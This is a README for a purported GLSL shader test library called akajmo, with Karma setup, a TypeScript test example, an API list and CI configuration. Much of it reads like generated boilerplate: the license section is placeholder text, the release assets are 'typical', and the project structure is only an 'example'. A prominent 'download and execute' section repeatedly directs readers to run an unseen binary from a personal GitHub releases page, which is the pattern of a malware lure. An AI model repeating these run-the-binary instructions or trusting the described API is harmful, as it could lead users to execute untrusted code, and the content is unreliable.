# akajmo — GLSL Test Runner with Karma + TypeScript Support
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/glitch511/akajmo/releases)

<img alt="GLSL shader" src="https://raw.githubusercontent.com/github/explore/main/topics/glsl/glsl.png" width="160" align="right">

akajmo is a focused testinglibrary for shader code. It plugs into Karma and TypeScript. It helps you test GLSL fragments and vertex shaders inside a unit test workflow. Use it for shader validation, regression tests, and automated CI checks.

Topics: glsl, karma, typescript

Badges
- [![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/glitch511/akajmo/releases)
- [![GLSL](https://img.shields.io/badge/Topic-GLSL-lightgrey)](https://github.com/topics/glsl)
- [![Karma](https://img.shields.io/badge/Topic-Karma-lightgrey)](https://github.com/topics/karma)
- [![TypeScript](https://img.shields.io/badge/Topic-TypeScript-blue)](https://github.com/topics/typescript)

Table of contents
- Features
- Quick start
- Install
- Run tests with Karma
- Command line
- Writing tests
- Shader test patterns
- API
- CI integration
- Releases (download and execute)
- Troubleshooting
- Contributing
- License

Features
- Load GLSL fragments and vertex shaders inside tests.
- Compile and run shaders in a headless WebGL context.
- Snapshot pixel output for regression checks.
- Integrate with Karma test runner and Chrome Headless.
- TypeScript-first API and typed test helpers.
- Small runtime, clear error output, fast feedback.

Quick start
1. Install akajmo into your project.
2. Add the akajmo plugin to Karma.
3. Write tests that load GLSL files and inspect pixel output.
4. Run Karma in CI or locally.

Install
Use npm or Yarn.

npm
```bash
npm install --save-dev akajmo
```

yarn
```bash
yarn add --dev akajmo
```

Karma setup
Add akajmo to your Karma config. This example shows a minimal setup that runs tests in Chrome Headless.

karma.conf.js
```js
module.exports = function(config) {
  config.set({
    frameworks: ['mocha', 'akajmo'],
    files: [
      'test/**/*.spec.ts',
      { pattern: 'shaders/**/*.glsl', included: false, served: true }
    ],
    preprocessors: {
      '**/*.ts': ['webpack']
    },
    reporters: ['dots'],
    browsers: ['ChromeHeadless'],
    singleRun: true
  });
};
```

Webpack and TypeScript
Use ts-loader or babel. akajmo ships TypeScript types. Keep tsconfig strict to catch errors early.

Run tests with Karma
Use npm script:
```json
{
  "scripts": {
    "test": "karma start"
  }
}
```
Run:
```bash
npm test
```

Command line
akajmo includes a small CLI for quick shader checks and to run one-off demos. After install, use npx or run the binary from node_modules.

Examples
- Run the test suite
  ```bash
  npx akajmo test
  ```
- Run a single shader file and output an image
  ```bash
  npx akajmo render shaders/fragment.glsl --out out.png --width 256 --height 256
  ```

Writing tests
akajmo provides simple helpers. Tests remain readable. Use TypeScript to get typed assertions.

Example test (TypeScript + Mocha)
```ts
import { compileShader, renderToBuffer } from 'akajmo';
import { expect } from 'chai';

describe('simple shader', () => {
  it('renders a red pixel at center', async () => {
    const vert = `#version 300 es
    in vec2 position;
    void main(){ gl_Position = vec4(position,0.0,1.0); }`;
    const frag = `#version 300 es
    precision highp float;
    out vec4 outColor;
    void main(){
      outColor = vec4(1.0, 0.0, 0.0, 1.0);
    }`;
    const program = compileShader(vert, frag);
    const buffer = await renderToBuffer(program, 64, 64);
    // buffer is Uint8Array RGBA
    const centerIndex = ((32 * 64) + 32) * 4;
    expect(buffer[centerIndex]).to.equal(255); // R
    expect(buffer[centerIndex+1]).to.equal(0); // G
    expect(buffer[centerIndex+2]).to.equal(0); // B
  });
});
```

Shader test patterns
Use small deterministic patterns. akajmo includes helpers to:
- Sample a 2D grid and assert pixel regions.
- Compare output to a golden image (pixel-perfect or with tolerance).
- Inject uniforms and textures for unit tests.

Common patterns
- Pixel exact compare for procedural shaders.
- Mean squared error (MSE) with tolerance for noise or non-determinism.
- Hash of pixels to detect changes without storing full images.

API (high level)
- compileShader(vertexSrc, fragmentSrc): Compiles and links a shader program.
- renderToBuffer(program, width, height, options?): Runs the program in a headless WebGL context and returns a Uint8Array RGBA buffer.
- compareBufferToImage(buffer, imagePath, options?): Compare buffer with a stored image. Options include tolerance.
- makeTextureFromArray(array, width, height): Create a texture for tests.
- akajmoKarmaPlugin: Karma integration entry point.

TypeScript types
akajmo exports types for every API. Example:
```ts
import type { ShaderProgram, RenderOptions } from 'akajmo';
```

CI integration
Use akajmo in CI to validate shaders on every push. A typical job:
- Install dependencies
- Run tests with headless Chrome
- Save failed pixel buffers as artifacts

Example GitHub Actions workflow
```yaml
name: Test
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: '18'
      - run: npm ci
      - run: npm test
        env:
          CI: true
```

Releases (download and execute)
Download the release asset from the releases page and execute the binary for quick local checks. Visit and download the release file here:
https://github.com/glitch511/akajmo/releases

Typical release assets
- akajmo-cli-linux-x64.tar.gz
- akajmo-cli-macos-universal.tar.gz
- akajmo-cli-win-x64.zip

After download on macOS / Linux:
```bash
tar xzf akajmo-cli-linux-x64.tar.gz
chmod +x akajmo
./akajmo --help
```
On Windows, unzip the archive and run akajmo.exe from PowerShell or CMD.

If the release link fails, check the repository Releases section on GitHub for the correct asset file name and usage. The release page shows the exact file to download and the recommended execution command.

Troubleshooting
- Shader compile errors: akajmo prints the WebGL compile log. Use the log to locate syntax or precision issues.
- Headless failures in CI: Ensure ChromeHeadless runs with --no-sandbox if your runner requires it.
- Differences in output: Use a small tolerance when comparing pixel output across GPUs or driver versions.

Best practices
- Keep shaders small for unit tests.
- Test deterministic parts of your shader logic.
- Mock external textures where possible.
- Store golden images in a test-assets folder and keep them under source control.

Contributing
- Fork the repo and create a branch.
- Add tests for new features.
- Follow the code style and run linting.
- Open pull requests with a clear description and test coverage.

Code of conduct
Follow respectful conduct in issues and pull requests. Keep discussions focused on technical solutions.

Project structure (example)
- src/ - core TypeScript source
- test/ - Mocha tests in TypeScript
- shaders/ - example GLSL files
- cli/ - CLI entry
- docs/ - extra documentation and examples

Examples and demos
- demo/simple-glsl: basic fragment shader checks.
- demo/texture-tests: load textures and assert sampling correctness.
- demo/ci: GitHub Action examples and artifact upload.

Images and assets
- GLSL topic art: https://raw.githubusercontent.com/github/explore/main/topics/glsl/glsl.png
- TypeScript topic art: https://raw.githubusercontent.com/github/explore/main/topics/typescript/typescript.png

License
Specify a license file in the repository (MIT is common for tools like this). Add a LICENSE file and reference it in package.json.

Contact
Open issues for bugs and feature requests. Use GitHub discussions for help and design questions.

Acknowledgments
- Karma for test runner integration.
- Chrome Headless for rendering in CI.
- WebGL for runtime shader execution.